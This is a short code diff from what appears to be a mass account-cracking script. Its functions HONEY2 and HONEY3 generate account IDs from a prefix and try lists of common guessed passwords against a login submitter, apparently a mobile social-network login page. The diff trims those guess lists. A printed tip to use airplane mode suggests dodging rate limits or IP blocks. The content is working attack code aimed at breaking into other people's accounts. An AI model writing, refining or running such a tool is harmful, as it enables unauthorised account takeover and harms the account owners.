@@ -1371,7 +1371,7 @@ def HONEY2():
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'57273200','59039200','57575751','57575752','free fire','i love you','freefire123']
+			pwx = [kode+guru,mk,'57273200']
 			
 
 			if HONEYfire =='1':yaari.submit(mbasic,uid,pwx,tl)
@@ -1439,7 +1439,7 @@ def HONEY3():
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
-			pwx = [kode+guru,mk,'5727200','59039200','57575751','khan123','khan1122','Free Fire','i love you','freefire123','free fire','khan12345']		
+			pwx = [kode+guru,mk,'5727200','59039200','57575751','khan123','khan12345']		
 			if HONEYfire =='1':yaari.submit(mbasic,uid,pwx,tl)
 			elif HONEYfire =='2':yaari.submit(p,uid,pwx,tl)
 			elif HONEYfire =='3':yaari.submit(x,uid,pwx,tl)
